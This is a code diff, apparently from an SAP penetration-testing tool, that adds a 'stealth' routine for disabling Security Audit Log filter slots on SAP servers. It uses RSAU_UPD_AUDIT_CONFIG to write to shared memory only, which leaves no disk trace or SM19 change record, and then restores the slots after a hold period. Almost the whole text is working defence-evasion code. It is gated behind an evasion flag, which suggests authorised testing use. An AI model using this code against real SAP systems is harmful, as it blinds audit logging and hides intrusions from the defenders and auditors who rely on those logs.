@@ -30,7 +30,9 @@ from typing import Optional
 
 from sapmap_evasion_baseline import (capture_baseline, change_param,
                                        evasion_window,
-                                       write_dyn_profile)
+                                       write_dyn_profile,
+                                       read_legacy_sal_config,
+                                       write_legacy_sal_config)
 from sapmap_evasion_gate import (assert_evasion_allowed,
                                    EvasionGateError, technique_label)
 
@@ -487,39 +489,158 @@ def _normalize_slotnos(slotno_input, all_rows) -> list:
     return [s.zfill(4)]
 
 
+def _try_stealth_sal_slot_disable(state, node, sid, slotno,
+                                   hold_seconds, creds,
+                                   technique) -> Optional[dict]:
+    """Attempt SAL slot disable via RSAU_UPD_AUDIT_CONFIG (SHM-only).
+
+    Returns ``None`` if the legacy FMs aren't available on this kernel
+    (caller should fall back to the RSAU_API_SET_PROFILE path).
+    Returns a result dict if the stealth path was attempted.
+    """
+    import time as _time
+    import sapmap_rfc
+
+    try:
+        with sapmap_rfc._get_connection(node, creds) as conn:
+            probe = read_legacy_sal_config(conn)
+    except Exception:
+        return None
+    if not probe["ok"] or not probe["slotinfo"]:
+        return None
+
+    with evasion_window(node, state, technique, creds=creds,
+                         touched_params=[],
+                         touched_dyn_profile=False) as frame:
+        snap = frame["snapshot"]
+
+        with sapmap_rfc._get_connection(node, creds) as conn:
+            fresh = read_legacy_sal_config(conn)
+            if not fresh["ok"]:
+                return _wrap_result(
+                    technique, False,
+                    slotno=str(slotno), hold_seconds=hold_seconds,
+                    error=f"fresh legacy read failed: {fresh['error']}")
+
+            rows = fresh["slotinfo"]
+            baseline_rows = [dict(r) for r in rows]
+
+            augmented = [{**r, "SLOTNO": str(i + 1).zfill(4)}
+                         for i, r in enumerate(rows)]
+            target_slots = _normalize_slotnos(slotno, augmented)
+            if not target_slots:
+                return _wrap_result(
+                    technique, False,
+                    slotno=str(slotno), hold_seconds=hold_seconds,
+                    error="no target slots resolved")
+
+            max_slot = len(rows)
+            for s in target_slots:
+                idx = int(s) - 1
+                if idx < 0 or idx >= max_slot:
+                    return _wrap_result(
+                        technique, False,
+                        slotno=",".join(target_slots),
+                        hold_seconds=hold_seconds,
+                        error=f"slot {s} out of range (max {max_slot})")
+
+            baseline_statuses = {}
+            active_before = 0
+            for s in target_slots:
+                st = str(rows[int(s) - 1].get("STATUS", "")).strip() or " "
+                baseline_statuses[s] = st
+            for r in rows:
+                if str(r.get("STATUS", "")).strip() == "X":
+                    active_before += 1
+
+            target_indices = {int(s) - 1 for s in target_slots}
+            mutated = [dict(r) for r in rows]
+            for idx in target_indices:
+                mutated[idx]["STATUS"] = " "
+
+            print(f"[*] {sid}: SAL slot disable (stealth/SHM) — targets "
+                  f"{','.join(target_slots)} (baseline {baseline_statuses}); "
+                  f"{active_before}/{len(rows)} active")
+
+            w = write_legacy_sal_config(conn, mutated, enable="-")
+            if not w["ok"]:
+                return _wrap_result(
+                    technique, False,
+                    slotno=",".join(target_slots),
+                    hold_seconds=hold_seconds,
+                    baseline_statuses=baseline_statuses,
+                    before_active_count=active_before,
+                    error=f"stealth write failed: {w['error']}")
+
+            print(f"[+] {sid}: SAL slot(s) {','.join(target_slots)} "
+                  f"disabled (SHM-only) — holding {hold_seconds}s")
+
+        try:
+            from sapmap_findings import emit_finding
+            emit_finding(
+                "INFO", sid,
+                f"Tier 3: SAL slot(s) {','.join(target_slots)} "
+                f"disabled via RSAU_UPD_AUDIT_CONFIG "
+                f"(shared-memory only — no disk persistence, no SM19 "
+                f"header change)")
+        except Exception:
+            pass
+
+        try:
+            _time.sleep(max(0.0, float(hold_seconds)))
+        finally:
+            print(f"[*] {sid}: restoring SAL slots (stealth/SHM)...")
+            try:
+                with sapmap_rfc._get_connection(node, creds) as conn:
+                    r = write_legacy_sal_config(conn, baseline_rows,
+                                                 enable="-")
+                    if r["ok"]:
+                        print(f"[+] {sid}: SAL slots restored "
+                              f"(SHM-only, no disk trace)")
+                    else:
+                        print(f"[!] {sid}: stealth restore failed: "
+                              f"{r['error']}")
+            except Exception as re:
+                print(f"[!] {sid}: stealth restore exception: {re}")
+
+    try:
+        from sapmap_findings import emit_finding
+        emit_finding("INFO", sid,
+                     f"Tier 3: SAL slot(s) {','.join(target_slots)} "
+                     f"restored (stealth — no disk trace)")
+    except Exception:
+        pass
+
+    return _wrap_result(
+        technique, True,
+        slotno=",".join(target_slots),
+        hold_seconds=hold_seconds,
+        baseline_statuses=baseline_statuses,
+        before_active_count=active_before,
+        after_restore="stealth via RSAU_UPD_AUDIT_CONFIG (SHM-only)",
+        stealth_mode=True)
+
+
 def tier3_sal_slot_disable(state, node, slotno,
                               profile_name: str = "",
                               hold_seconds: float = 5.0,
                               creds=None) -> dict:
-    """Phase 3 step 2 — disable one SAL filter slot for *hold_seconds*,
-    then restore.
+    """Disable one or more SAL filter slots for *hold_seconds*, then restore.
 
-    The first concrete Tier 3 technique.  Flow:
+    Two writer paths, tried in order:
 
-      1. Assert ``--allow-evasion`` AND a baseline exists.
-      2. Open an ``evasion_window`` with
-         ``touched_dyn_profile=True`` so window exit auto-rewrites
-         the baseline ET_FILT / ET_FILTEX / ET_TEXT rows.
-      3. Read the current dynamic profile fresh (mutate from kernel
-         state, not stale snapshot).
-      4. Find the row whose ``SLOTNO`` matches; flip
-         ``STATUS='X'`` → ``STATUS=' '``.
-      5. Write the modified rows back via ``write_dyn_profile``.
-      6. Sleep ``hold_seconds`` — the operator can verify in SM19 /
-         RSAU_CONFIG that the slot is genuinely inactive on the
-         server during this window.
-      7. Window exit fires the dyn-profile restore, writing the
-         baseline rows back as captured.
+      **Stealth (primary):** ``RSAU_UPD_AUDIT_CONFIG`` — writes to
+      kernel shared memory only.  No disk persistence, no profile-name
+      header change, no "Last changed by" timestamp in SM19.
+
+      **Fallback:** ``RSAU_API_SET_PROFILE`` — also persists the
+      static profile to disk (SM19 shows "Last changed by SAPMAP00").
+      Only used if the legacy FMs aren't available on the kernel.
 
     Args:
-        slotno: target slot identifier, e.g. ``"0001"`` or ``1``.
-        hold_seconds: how long to keep the slot disabled before
-            restoring.  Defaults to 5 seconds — long enough for the
-            operator to glance at RSAU_CONFIG.
-
-    Returns ``{ok, technique, slotno, hold_seconds, baseline_status,
-    before_active_count, after_restore, error}``.  ``before_active_count``
-    is the count of STATUS='X' rows at mutation time (sanity check).
+        slotno: ``"1"``, ``"1,2,3"``, list, or ``"ALL"``.
+        profile_name: only needed for the fallback writer path.
+        hold_seconds: how long to keep slots disabled before restore.
     """
     import time as _time
     technique = "sal_filter_narrow"
@@ -533,6 +654,28 @@ def tier3_sal_slot_disable(state, node, slotno,
     sid = getattr(node, "sid", "?")
     explicit_name = (profile_name or "").strip()
 
+    # Primary path: stealth via RSAU_UPD_AUDIT_CONFIG (SHM-only, no
+    # disk persistence, no SM19 header change).  Falls back to the
+    # RSAU_API_SET_PROFILE path below if the legacy FMs are missing.
+    try:
+        stealth = _try_stealth_sal_slot_disable(
+            state, node, sid, slotno, hold_seconds, creds, technique)
+        if stealth is not None:
+            return stealth
+    except EvasionGateError:
+        raise
+    except Exception as e:
+        logger.debug(f"{sid}: stealth path unavailable, falling back "
+                     f"to API path: {e}")
+
+    # Fallback: RSAU_API_SET_PROFILE (also persists static profile to disk).
+    if not explicit_name:
+        return _wrap_result(
+            technique, False,
+            slotno=str(slotno), hold_seconds=hold_seconds,
+            error=("SAL profile name required for fallback writer — "
+                   "pass profile_name (RSAU_CONFIG 'Current Profile/"
+                   "Filter: <NAME>/NN'; e.g. 'SAPSEC')"))
     try:
         # touched_params=[] explicitly opts OUT of the param restore
         # loop — this technique only mutates the dyn profile, so
